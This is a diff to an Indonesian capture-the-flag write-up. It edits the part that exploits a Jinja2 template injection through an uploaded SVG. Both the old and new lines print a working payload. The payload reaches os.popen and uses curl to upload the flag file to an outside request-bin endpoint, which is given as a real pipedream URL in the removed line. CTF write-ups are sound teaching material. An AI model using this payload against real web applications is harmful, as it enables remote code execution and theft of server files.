@@ -1336,7 +1336,7 @@ image None
 ..[snip]..
 ```
 
-Template Injection, dengan menambahkan {%raw%}{{ 2\*2 }}{%endraw%}` pada svg file.
+Template Injection, dengan menambahkan `{%raw%}{{ 2\*2 }}{%endraw%}` pada svg file.
 
 ```html
 ..[snip]..
@@ -1384,15 +1384,13 @@ drwxr-xr-x   1 root root 4096 Aug  3 07:00 var
 ..[snip]..
 ```
 
-Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`. Ternyata kita tidak bisa stdout pada website.
-
-Lalu, dilakukan upload file flag ke server. Pertama, dengan membuat endpoint requests dulu dengan RequestsBin.
+Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`. Ternyata kita tidak bisa stdout pada website. Lalu, dilakukan upload file flag ke server. Pertama, dengan membuat endpoint requests dahulu (saya menggunakan RequestsBin).
 
 Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payloadnya.
 
 ```py
 <svg>
-    <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}{%endraw%}</image>
+    <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('curl [URL_ENDPOINT] --upload-file /loooool_ini_lho_fl4gnya').read() }}{%endraw%}</image>
 </svg>
 ```
 
